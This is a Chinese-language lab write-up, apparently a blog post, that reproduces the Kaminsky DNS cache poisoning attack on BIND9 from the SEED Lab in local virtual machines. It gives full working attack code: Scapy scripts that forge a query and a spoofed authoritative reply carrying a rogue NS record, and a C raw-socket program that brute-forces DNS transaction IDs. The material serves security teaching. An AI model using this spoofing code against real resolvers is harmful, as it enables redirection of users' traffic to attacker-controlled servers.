# **DNS 缓存中毒--Kaminsky 攻击复现** 

<br>

# 0x00 搭建实验环境

<br>

使用3台Ubuntu 16.04虚拟机，可到下面的参考链接下载

攻击的服务是BIND9，由于条件限制，这里使用本地的一台虚拟机当作远程DNS解析器，关闭了DNSSEC服务，其中三台机器IP地址，如下图所示：

![1](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331125020.png)

具体的实验环境搭建过程，可参考：[SEED Lab Description](https://seedsecuritylabs.org/Labs_16.04/PDF/DNS_Remote_new.pdf)

<br>

**配置User VM：**

在用户机 的  `/etc/resolvconf/resolv.conf.d/head`文件中，加入下面语句，将其Local DNS 设为 10.0.2.5。

![image-20210331150924216](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331150924.png)

<br>

更新 resolv.conf 文件 

```bash
sudo resolvconf  -u
```

<br>

进行验证：`dig www.example.com `,SERVER 为 要设置的Local DNS ip ，即表示设置成功。

![](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331152304.png)

<br>

<br>

**配置 Local  DNS Server VM：**

编辑 /etc/bind/named.conf.options文件，①关闭DNSSEC ②将缓存 存放在dump.db文件 ③设置查询请求源端口为33333

![image-20210331153128717](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331153128.png)

<br>

编辑 /etc/bind/named.conf文件，红框中的 可以帮助我们在 attack32.com不存在的情况下，也能进行转发。（在本地域名服务器里面设置，到查询这个域名，不去询问根域名，不用买域名服务器，去询问10.0.2.6,其他域名还是去根域名依次递归查询找的。）

![image-20210331153447782](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331153447.png)

<br>

全配置好之后，重启bind9服务。

```bash
sudo service bind9 restart
```

<br>

<br>

**配置 attacker VM：**

编辑 /etc/bind/named.conf 文件，设置两个attack32.com,example.com两个域。

![image-20210331155044938](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331155044.png)

<br>

编辑  /etc/bind/attack32.com.zone 文件

![image-20210331155343706](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331155343.png)

<br>

编辑 /etc/bind/example.com.zone文件

![image-20210331155545866](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331155545.png)

<br>

这里的含义是，如果缓存中毒，会把攻击者的机器当作权威域名服务器，向其 发出询问，而攻击者机器下的example.com.zone 文件时伪造的，欺骗的。

<br>

全配置好之后，重启bind9服务

```bash
sudo service bind9 restart
```

<br>

<br>

# 0x01攻击概述

<br>

### 攻击条件

①攻击者无法进行链路上的窃听，但具有IP欺骗能力，攻击者拥有一台attack32.com域名服务器。

②服务器没有开启DNSSEC功能。

③服务器没有进行源端口随机化，且已知发出查询的源端口为33333。

<br>

### 攻击模型

![2](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331145336.png)

<br>

①攻击者先向DNS 解析器发送一个xxxxx.example.com 的DNS查询报文，触发解析器去向根域名服务器，顶级域名服务器，权威域名服务器递归解析。

②递归解析器向权威域名服务器发出查询请求。

③攻击者发送大量的伪造的权威域名服务器响应数据包，其中使用NS记录，将example.com整个域的查询 转向attack32.com，攻击者的域名，实现缓存中毒。一旦TXID命中，即可造成缓存中毒。

④真正的权威域名服务器进行响应。

<br>

<br>

# 0x02 实验代码

**思路：**使用C代码伪造DNS数据包 代码运行速度较快，完全可以满足攻击要求，但构造过程较为复杂，使用python scapy库的方式，构造数据包简单，但执行速度较慢，使Local DNS 缓存中毒难度较大。 

综合以上，我们打算 结合二者，先用python scapy 库构造数据包，保存为二进制文件，然后再用C语言去加载构造的数据包，在相应的偏移位置做出修改。（ 可以使用bless工具去查看偏移量 ）。

<br>

因为需要去循环进行查询，爆破相应transaction ID，所以我们要修改的在触发查询的请求包中主要是请求的域名，在响应包里面需要修改域名，transaction ID。

<br>

<br>

**伪造请求包触发DNS解析器递归查询**

```python
from scapy.all import *

target_name="xxxxx.example.com"    

ip  = IP(dst='10.0.2.5',src='10.0.2.6')                #dst为Local DNS IP，src是攻击者IP。
udp = UDP(dport=53,sport=1234,chksum=0)
qds = DNSQR(qname=target_name)
dns = DNS(id=0xaaaa,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=qds)
Querypkt= ip/udp/dns

with open('Query.bin','wb')as f:
	f.write(bytes(Querypkt))
```

<br>

使用bless 查看偏移量：

![image-20210331140222901](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331140222.png)

<br>

发现xxxxx.example.com 在数据包中的偏移量为0x29，及转化为十进制为41。

后面会使用C code 进行修改。

<br>

<br>

**伪造响应包**

```python
from scapy.all import *

targetName="xxxxx.example.com"
targetDomain="example.com"
attackerNS ="ns.attack32.com"

dstIP="10.0.2.5"
srcIP='199.43.135.53'                                    

ip = IP(dst=dstIP,src=srcIP,chksum=0)
udp = UDP(dport=33333,sport=53,chksum=0)

Qdsec = DNSQR(qname=targetName)
Ansec = DNSRR(rrname=targetName,type='A',rdata='1.2.3.4',ttl=259200)
NSsec = DNSRR(rrname=targetDomain,type='NS',rdata=attackerNS,ttl=259200)
dns   = DNS(id=0xAAAA,aa=1,rd=1,qr=1,qdcount=1,ancount=1,nscount=1,arcount=0,qd=Qdsec,an=Ansec,ns=NSsec)
Replypkt = ip/udp/dns

with open('Reply.bin','wb') as f:
	f.write(bytes(Replypkt))
```

<br>

使用bless查看偏移量：

![image-20210331140636415](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331140636.png)

<br>

因为之前我们生成的响应数据包transaction ID为0xAAAA，所以这里我们可以直接查找16进制代码找到，偏移量为0x1c，十进制为28。

同理，第一个xxxxx.example.com 在数据包中的偏移量为0x29，41，第二个xxxxx.example.com 在数据包中的偏移量为0x40，64。

<br>

<br>

**C攻击代码：**

<br>

```c
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>

#define MAX_FILE_SIZE 2000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);


int main()
{
  long i = 0;

  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("Query.bin", "rb");
  if (!f_req) {
     perror("Can't open 'Query.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("Reply.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'Reply.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  unsigned short transaction_id = 0;
  while (1) {
    

    // Generate a random name with length 5
    char name[5];
    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];
	printf("attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n", 
	     ++i, name, transaction_id);


    //##################################################################
    /* Step 1. Send a DNS request to the targeted local DNS server
              This will trigger it to send out DNS queries */
    memcpy(ip_req+41,name,5);               //偏移量为41
    send_raw_packet(ip_req, n_req);
   


    // Step 2. Send spoofed responses to the targeted local DNS server.
    memcpy(ip_resp+41,name,5);               //xxxxx 两个域名偏移量为 41 和64
    memcpy(ip_resp+64,name,5);
	
    for(int i=0;i<100;i++)
	{
		transaction_id++;
		
		memcpy(ip_resp+28,&transaction_id,2); 
		send_raw_packet(ip_resp,n_resp);
	}
  
    
    //##################################################################
  }
return 0;
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;          //IP包
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;
  
  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
```

<br>

<br>

# 0x03 详细过程

`dig www.example.com` 进行解析,可得到正常情况下的地址为93.184.216.34

![image-20210331121835365](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331121835.png)

<br>

未发动攻击前，使用check.sh查看缓存，缓存中并没有相应记录。

![image-20210331120044725](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331120051.png)

<br>

注意使用raw socket 要使用 sudo进行执行程序。

![image-20210331131904789](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331131904.png)

<br>

程序运行过程：

![image-20210331132024205](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331132024.png)

<br>

<br>

# 0x04 结果验证

<br>

在Local DNS sever 端 写了一个bash脚本check.sh，进行验证，也可直接在terminal终端使用中间两条命令。

```bash
#!/bin/bash

echo 'dump the cache'
sudo rndc dumpdb -cache                                   
cat /var/cache/bind/dump.db | grep attack
echo 'if there is no result,the attack has not succeed yet'
```

**sudo rndc dumpdb -cache**       将bind的缓存转存到`/var/cache/bind/dump.db`中

**cat /var/cache/bind/dump.db | grep attack**     查看dump.db文件，	grep attack 查找带有attack的。

<br>

大约十秒左右，即可在Sever VM，通过check.sh脚本查看到结果。

![image-20210331132235925](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331132235.png)

<br>

然后在User VM，进行验证。

![image-20210331132453766](https://cdn.jsdelivr.net/gh/sumsunsuns/Blog-Photo@main/20210331132453.png)

<br>

**攻击成功!**

<br>

<br>

<br>

# 0x05 参考资料

<br>

[SEED Lab](https://seedsecuritylabs.org/Labs_16.04/Networking/DNS_Remote/)



[SEED Lab Description](https://seedsecuritylabs.org/Labs_16.04/PDF/DNS_Remote_new.pdf)









